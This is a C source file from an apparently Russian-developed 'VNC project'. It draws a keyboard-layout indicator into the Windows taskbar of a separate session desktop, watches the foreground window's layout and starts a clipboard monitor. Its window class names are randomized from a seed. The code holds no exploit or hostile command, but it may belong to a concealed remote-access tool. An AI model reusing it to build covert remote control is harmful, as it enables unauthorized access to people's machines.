//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: layout.c
// $Revision: 199 $
// $Date: 2014-07-14 20:16:01 +0400 (Пн, 14 июл 2014) $
// description: 
//	keyboard layout switcher

#include "project.h"
#include "clipbd.h"
#include "start_menu.h"

#pragma warning (disable:4244)

static int m_stnWindowHeight = 30;
static int m_stnWindowWidth = 30;

#define TIMER_EV  100
#define TIMER_KBD 101

//////////////////////////////////////////////////////////////////////////

void LS_MoveTray(PVNC_SESSION pSession)
{
	RECT coRectReBar;
	RECT coRect;

	int nDiff = 3;
	int nRightSmaller = 5;
	int nCenter = 0;

	HWND hReBarWindow = pSession->Desktop.LayoutSwitcher.hReBarWindow;
	HWND hTrayWnd = pSession->Desktop.LayoutSwitcher.hTrayWnd;
	int nHeightTskControl;
	int Proportion;

	GetWindowRect(hReBarWindow,&coRectReBar);

	Proportion = GetWindowProportion(hReBarWindow);
	if ( Proportion == HORIZONTAL)
	{		
		nHeightTskControl = coRectReBar.bottom - coRectReBar.top;
		if (nHeightTskControl > m_stnWindowHeight)
		{
			nCenter = (nHeightTskControl - m_stnWindowHeight) / 2;
			nHeightTskControl = m_stnWindowHeight ;
		}

		nDiff = nHeightTskControl / 10;

		coRect.left   = coRectReBar.right;
		coRect.top    = 0+nDiff+nCenter;
		coRect.right  = coRectReBar.right+m_stnWindowWidth-nRightSmaller;
		coRect.bottom = nHeightTskControl-nDiff+nCenter;

		MoveWindow(
			pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
			coRect.left, 
			coRect.top, 
			m_stnWindowWidth-nRightSmaller, 
			coRect.bottom-coRect.top, 
			TRUE
			);
	}
	else if ( Proportion == VERTICAL )
	{		

		coRect.left   = 0+nDiff;
		coRect.top    = coRectReBar.bottom;
		coRect.right  = coRectReBar.right-coRectReBar.left-nDiff;
		coRect.bottom = coRectReBar.bottom+m_stnWindowHeight-nRightSmaller;

		MoveWindow(
			pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
			coRect.left, 
			coRect.top, 
			coRect.right-coRect.left, 
			m_stnWindowHeight-nRightSmaller, 
			TRUE
			);
	}
	RedrawWindow(
		pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
		NULL,NULL,
		RDW_UPDATENOW|RDW_FRAME|RDW_INVALIDATE 
		);
}

void LS_ModifyTaskbar(PVNC_SESSION pSession)
{
	HWND hReBarWindow = pSession->Desktop.LayoutSwitcher.hReBarWindow;
	HWND hTrayNotifyWnd = pSession->Desktop.LayoutSwitcher.hTrayNotifyWnd;
	HWND hTrayWnd = pSession->Desktop.LayoutSwitcher.hTrayWnd;

	RECT coReBarWindowRect,ReBarWindowCurrentRect;
	RECT coTrayNotifyWndRect;
	RECT coTrayWndRect;
	int Proportion;

	GetWindowRect(hReBarWindow,&coReBarWindowRect);
	GetWindowRect(hTrayNotifyWnd,&coTrayNotifyWndRect);
	GetWindowRect(hTrayWnd,&coTrayWndRect);

	Proportion = GetWindowProportion(hReBarWindow);

	if ( Proportion == HORIZONTAL )
	{ 
		ReBarWindowCurrentRect.left = coReBarWindowRect.left + coTrayWndRect.left;
		ReBarWindowCurrentRect.right = 
			coTrayNotifyWndRect.left-coReBarWindowRect.left-m_stnWindowWidth + coTrayWndRect.left;
		ReBarWindowCurrentRect.bottom = coReBarWindowRect.bottom-coReBarWindowRect.top;
		ReBarWindowCurrentRect.top = 0;

		pSession->Desktop.LayoutSwitcher.nMode = HORIZONTAL;	
	}
	else if ( Proportion == VERTICAL )
	{		
		ReBarWindowCurrentRect.left =  0;
		ReBarWindowCurrentRect.right = coTrayNotifyWndRect.right-coTrayNotifyWndRect.left;
		ReBarWindowCurrentRect.top = coReBarWindowRect.top + coTrayWndRect.top;
		ReBarWindowCurrentRect.bottom = 
			coTrayNotifyWndRect.top - m_stnWindowHeight - coReBarWindowRect.top + coTrayWndRect.top;

		pSession->Desktop.LayoutSwitcher.nMode = VERTICAL;
	}

	MoveWindow(
		hReBarWindow, 
		ReBarWindowCurrentRect.left, 
		ReBarWindowCurrentRect.top, 
		ReBarWindowCurrentRect.right, 
		ReBarWindowCurrentRect.bottom, 
		TRUE
		);
}

void LS_ReModifyTaskbar(PVNC_SESSION pSession)
{
	HWND hReBarWindow = pSession->Desktop.LayoutSwitcher.hReBarWindow;
	HWND hTrayNotifyWnd = pSession->Desktop.LayoutSwitcher.hTrayNotifyWnd;
	HWND hTrayWnd = pSession->Desktop.LayoutSwitcher.hTrayWnd;

	RECT coReBarWindowRect,ReBarWindowCurrentRect;
	RECT coTrayNotifyWndRect;
	RECT coTrayWndRect;

	GetWindowRect(hReBarWindow,&coReBarWindowRect);
	GetWindowRect(hTrayNotifyWnd,&coTrayNotifyWndRect);
	GetWindowRect(hTrayWnd,&coTrayWndRect);

	if (pSession->Desktop.LayoutSwitcher.nMode == HORIZONTAL)
	{
		ReBarWindowCurrentRect.left   = coReBarWindowRect.left   + coTrayWndRect.left;
		ReBarWindowCurrentRect.right  = coTrayNotifyWndRect.left - coReBarWindowRect.left;
		ReBarWindowCurrentRect.top    = 0;
		ReBarWindowCurrentRect.bottom = coReBarWindowRect.bottom - coReBarWindowRect.top;
	}
	else if (pSession->Desktop.LayoutSwitcher.nMode == VERTICAL)
	{
		ReBarWindowCurrentRect.left   = 0;
		ReBarWindowCurrentRect.right  = coTrayNotifyWndRect.right - coTrayNotifyWndRect.left;
		ReBarWindowCurrentRect.top    = coReBarWindowRect.top     + coTrayWndRect.top;
		ReBarWindowCurrentRect.bottom = coTrayNotifyWndRect.top   - coReBarWindowRect.top;
	}

	MoveWindow(
		hReBarWindow, 
		ReBarWindowCurrentRect.left, 
		ReBarWindowCurrentRect.top, 
		ReBarWindowCurrentRect.right, 
		ReBarWindowCurrentRect.bottom, 
		TRUE
		);
}

void LS_TrayOnTimer(PVNC_SESSION pSession, UINT nIDEvent)
{
	HWND hReBarWindow = pSession->Desktop.LayoutSwitcher.hReBarWindow;
	HWND hTrayNotifyWnd = pSession->Desktop.LayoutSwitcher.hTrayNotifyWnd;
	HWND hTrayWnd = pSession->Desktop.LayoutSwitcher.hTrayWnd;

	RECT coReBarWindowRect;
	RECT coTrayNotifyWndRect;
	RECT coTrayWndRect;
	int Proportion;

	if (nIDEvent == TIMER_EV )
	{
		GetWindowRect(hReBarWindow,&coReBarWindowRect);
		GetWindowRect(hTrayNotifyWnd,&coTrayNotifyWndRect);
		GetWindowRect(hTrayWnd,&coTrayWndRect);

		Proportion = GetWindowProportion(hReBarWindow);

		if (Proportion == HORIZONTAL)
		{
			if ( ((coTrayNotifyWndRect.left - coReBarWindowRect.right) < m_stnWindowWidth) )
			{
				LS_ModifyTaskbar(pSession);
				RedrawWindow(
					pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
					NULL,NULL,
					RDW_UPDATENOW|RDW_FRAME|RDW_INVALIDATE 
					);

				LS_MoveTray ( pSession );
			}
			else
			{
				RedrawWindow(
					pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
					NULL,NULL,
					RDW_UPDATENOW|RDW_FRAME|RDW_INVALIDATE 
					);
			}
		}
		else
		{
			if ( ((coTrayNotifyWndRect.top - coReBarWindowRect.bottom) < m_stnWindowHeight) )
			{
				LS_ModifyTaskbar(pSession);
				RedrawWindow(
					pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
					NULL,NULL,
					RDW_UPDATENOW|RDW_FRAME|RDW_INVALIDATE 
					);
				LS_MoveTray ( pSession );
			}
			else
			{
				RedrawWindow(
					pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
					NULL,NULL,
					RDW_UPDATENOW|RDW_FRAME|RDW_INVALIDATE 
					);
			}
		}
	}
	else if ( nIDEvent == TIMER_KBD )
	{
		HWND hForegroundWnd;
		HKL lay;

		hForegroundWnd = SS_GET_FOREGROUND_WND(pSession);
		if ( pSession->Desktop.LayoutSwitcher.hLayTrayWnd != hForegroundWnd )
		{
			lay=GetKeyboardLayout(GetWindowThreadProcessId(hForegroundWnd,0));
			if ( pSession->Desktop.LayoutSwitcher.hLayout != lay )
			{
				WCHAR szBuf[260];
				VerLanguageNameW((DWORD)(DWORD_PTR)lay,szBuf,260);
				GetLocaleInfoW(LOWORD(lay),LOCALE_SISO639LANGNAME,szBuf,260);
				CharUpperBuffW(szBuf,2);
				memcpy(pSession->Desktop.LayoutSwitcher.szLoc,szBuf,2*sizeof(WCHAR));
				pSession->Desktop.LayoutSwitcher.hLayout = lay;

				RedrawWindow(
					pSession->Desktop.LayoutSwitcher.hLayTrayWnd,
					NULL,NULL,
					RDW_UPDATENOW|RDW_FRAME|RDW_INVALIDATE 
					);
			}
		}
	}
}

VOID
	LS_TrayPaint(
		PVNC_SESSION pSession,
		HWND hWnd
		)
{
	COLORREF colFore, colBk, colTextFore, colTextBk;
	PAINTSTRUCT ps;
	HDC hDC,hCompDC;
	HBITMAP hBitmap;
	RECT LeftRect,ClientRect;
	RECT ClipRect;
	HRGN rgn;
	HGDIOBJ hOldFont, hOldBitmap;
	POINT point;

	colFore     = GetSysColor(COLOR_HIGHLIGHT);
	colBk       = GetSysColor(COLOR_WINDOW);
	colTextFore = GetSysColor(COLOR_HIGHLIGHT);
	colTextBk   = GetSysColor(COLOR_WINDOW);

	do 
	{
		GetClientRect(hWnd,&ClientRect);

		hDC = BeginPaint(hWnd, &ps);
		if ( !hDC ){
			break;
		}
		GetClipBox(hDC,&ClipRect);

		// create memory DC
		hCompDC  = CreateCompatibleDC(hDC);
		if ( !hCompDC ){
			break;
		}
		hBitmap = CreateCompatibleBitmap(hDC,ClipRect.right-ClipRect.left,ClipRect.bottom-ClipRect.top);
		if ( !hBitmap ){
			break;
		}
		
		//set bitmap
		hOldBitmap = SelectObject(hCompDC,hBitmap);
		SetWindowOrgEx(hCompDC, ClipRect.left, ClipRect.top, &point);

		// fill bk rect
		SetBkColor(hCompDC, colBk);
		ExtTextOut(hCompDC, 0, 0, ETO_OPAQUE, &ClientRect, NULL, 0, NULL);

		//set font and draw text
		hOldFont = SelectObject(hCompDC,pSession->Desktop.LayoutSwitcher.hFont);
		SetBkMode(hCompDC,TRANSPARENT);

		LeftRect = ClientRect;
		//LeftRect.right = LeftRect.left + (int)((LeftRect.right - LeftRect.left)*Fraction);

		rgn = CreateRectRgn(LeftRect.left, LeftRect.top, LeftRect.right, LeftRect.bottom);
		if ( rgn ){
			SelectClipRgn(hCompDC,rgn);
		}
		SetTextColor(hCompDC,colTextFore);
		DrawTextW(hCompDC,pSession->Desktop.LayoutSwitcher.szLoc,2,&ClientRect,DT_VCENTER+DT_SINGLELINE+DT_CENTER);
		if ( rgn ){
			DeleteObject(rgn);
		}

		BitBlt(
			hDC, 
			ClipRect.left, ClipRect.top, 
			ClipRect.right  - ClipRect.left, 
			ClipRect.bottom - ClipRect.top,
			hCompDC, 
			ClipRect.left, 
			ClipRect.top, 
			SRCCOPY
			);

	}while ( FALSE );

	if ( hOldFont ){
		SelectObject(hCompDC,hOldFont);
	}
	if ( hOldBitmap ){
		SelectObject(hCompDC,hOldBitmap);
	}
	if ( hBitmap ){
		DeleteObject(hBitmap);
	}
	if ( hCompDC ){
		DeleteDC(hCompDC);
	}
	if ( hDC ){
		EndPaint( hWnd, &ps );
	}
}

LRESULT CALLBACK 
	LS_TrayWindowProc(
		HWND hWnd,
		UINT uMsg,
		WPARAM wParam,
		LPARAM lParam
		)
{
	PVNC_SESSION pSession = (PVNC_SESSION)(LONG_PTR)GetWindowLongPtr(hWnd,GWLP_USERDATA);
	LRESULT fbResult = 0;

	switch (uMsg)
	{
	case WM_CREATE:
		pSession=(*(PVNC_SESSION*)lParam);
		// save desktop for other messages
		SetWindowLongPtr(hWnd,GWLP_USERDATA,(LONG_PTR)pSession);
		fbResult = TRUE;
		break;
	case WM_CLOSE:
		break;
	case WM_PAINT:
		LS_TrayPaint(pSession,hWnd);
		break;
	case WM_ERASEBKGND:
		break;
	case WM_TIMER:
		LS_TrayOnTimer(pSession,wParam);
		break;
	case WM_DESTROY:
		KillTimer( hWnd, TIMER_EV );
		KillTimer( hWnd, TIMER_KBD );
		if ( pSession->Desktop.LayoutSwitcher.hFont ){
			DeleteObject(pSession->Desktop.LayoutSwitcher.hFont);
		}
		break;
	default:
		fbResult = DefWindowProc(hWnd, uMsg, wParam, lParam);
		break;
	}
	return fbResult;
}

void LS_CreateTray(PVNC_SESSION pSession)
{
	RECT coRectReBar;
	RECT coRect;

	int nDiff = 3;
	int nRightSmaller = 5;
	int nCenter = 0;

	HWND hReBarWindow;
	HWND hTrayWnd;
	int nHeightTskControl;
	int Proportion;
	TCHAR szTrayClass[GUID_NAME_LENGTH];
	ULONG Seed;

	//register class
	WNDCLASS wc;
	
	Seed = *((PULONG)&pSession->Desktop.Name + 1);
	FillGuidName(&Seed,szTrayClass);

	wc.style       = 0;
	wc.lpfnWndProc = (WNDPROC)LS_TrayWindowProc;
	wc.cbClsExtra  = 0;
	wc.cbWndExtra  = 0;
	wc.hInstance   = GetModuleHandle(0);
	wc.hIcon       = NULL;
	wc.hCursor     = NULL;
	wc.hbrBackground = NULL;
	wc.lpszMenuName  = NULL;
	wc.lpszClassName = szTrayClass;

	// register class for tray window
	RegisterClass(&wc);

	// create font 
	pSession->Desktop.LayoutSwitcher.hFont = 
		CreateFont(
			-11,0,0,0,
			FW_NORMAL,
			FALSE,FALSE,FALSE,
			EASTEUROPE_CHARSET,
			OUT_DEFAULT_PRECIS,
			CLIP_DEFAULT_PRECIS,
			DEFAULT_QUALITY,
			DEFAULT_PITCH+FF_DONTCARE,
			_T("Tahoma")
			);

	hTrayWnd = pSession->Desktop.LayoutSwitcher.hTrayWnd = 
		FindWnd(NULL,_T("Shell_TrayWnd"),NULL);
	hReBarWindow = pSession->Desktop.LayoutSwitcher.hReBarWindow = 
		FindWnd(pSession->Desktop.LayoutSwitcher.hTrayWnd,_T("ReBarWindow32"),NULL);
	pSession->Desktop.LayoutSwitcher.hTrayNotifyWnd = 
		FindWnd(pSession->Desktop.LayoutSwitcher.hTrayWnd,_T("TrayNotifyWnd"),NULL);

	GetWindowRect(hReBarWindow,&coRectReBar);

	Proportion = GetWindowProportion(hReBarWindow);
	if ( Proportion == HORIZONTAL)
	{		
		nHeightTskControl = coRectReBar.bottom - coRectReBar.top;
		if (nHeightTskControl > m_stnWindowHeight)
		{
			nCenter = (nHeightTskControl - m_stnWindowHeight) / 2;
			nHeightTskControl = m_stnWindowHeight ;
		}

		nDiff = nHeightTskControl / 10;

		coRect.left   = coRectReBar.right;
		coRect.top    = 0+nDiff+nCenter;
		coRect.right  = coRectReBar.right+m_stnWindowWidth-nRightSmaller;
		coRect.bottom = nHeightTskControl-nDiff+nCenter;
	}
	else if ( Proportion == VERTICAL )
	{		

		coRect.left   = 0+nDiff;
		coRect.top    = coRectReBar.bottom;
		coRect.right  = coRectReBar.right-coRectReBar.left-nDiff;
		coRect.bottom = coRectReBar.bottom+m_stnWindowHeight-nRightSmaller;
	}

	pSession->Desktop.LayoutSwitcher.hLayTrayWnd =
		CreateWindow(
			szTrayClass,TEXT(""),
			WS_CHILDWINDOW | WS_VISIBLE | WS_CLIPSIBLINGS | WS_MAXIMIZEBOX,
			coRect.left,coRect.top,
			coRect.right  - coRect.left,
			coRect.bottom - coRect.top,
			hTrayWnd,
			NULL,
			wc.hInstance,
			pSession
			);

	if ( pSession->Desktop.LayoutSwitcher.hLayTrayWnd ){
		SetTimer( pSession->Desktop.LayoutSwitcher.hLayTrayWnd, TIMER_EV, 1000, NULL );
		SetTimer( pSession->Desktop.LayoutSwitcher.hLayTrayWnd, TIMER_KBD, 100, NULL );
	}
} 

VOID WINAPI LS_Tread(PVNC_SESSION pSession)
{
	SetThreadDesktop( pSession->Desktop.hDesktop );

	// create tray window
	LS_CreateTray(pSession);

	// start clipboard monitor
	ClipStartViewer(pSession);

	pSession->Desktop.LayoutSwitcher.bSwitcherStarted = TRUE;	

	while (WaitForSingleObject(pSession->SharedSection.hStatusEvent,0) == WAIT_TIMEOUT)
	{
		MSG msg;
		if (!GetMessage(&msg,NULL,0,0))
			break;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	// close window
	if ( pSession->Desktop.LayoutSwitcher.hLayTrayWnd ){
		DestroyWindow( pSession->Desktop.LayoutSwitcher.hLayTrayWnd );
	}

	// stop clipboard monitor
	ClipStopViewer( pSession );

	pSession->Desktop.LayoutSwitcher.bSwitcherStarted=FALSE;
	return;
}

void LS_Start(PVNC_SESSION pSession)
{
	if (pSession->Desktop.LayoutSwitcher.bSwitcherStarted)
		return;
	pSession->Desktop.LayoutSwitcher.hThread =
		CreateThread(
			NULL,0,
			(LPTHREAD_START_ROUTINE)LS_Tread,
			pSession,
			0,
			&pSession->Desktop.LayoutSwitcher.ThreadID
			);
	return;
}

void LS_Stop(PVNC_SESSION pSession)
{
	if ( pSession->Desktop.LayoutSwitcher.hThread ){
		if (pSession->Desktop.LayoutSwitcher.bSwitcherStarted)
		{
			PostThreadMessage( 
				pSession->Desktop.LayoutSwitcher.ThreadID,
				WM_NULL,0,0
				);
		}

		WaitForSingleObject( pSession->Desktop.LayoutSwitcher.hThread, INFINITE );
		CloseHandle( pSession->Desktop.LayoutSwitcher.hThread );
		pSession->Desktop.LayoutSwitcher.hThread = NULL;
	}
}


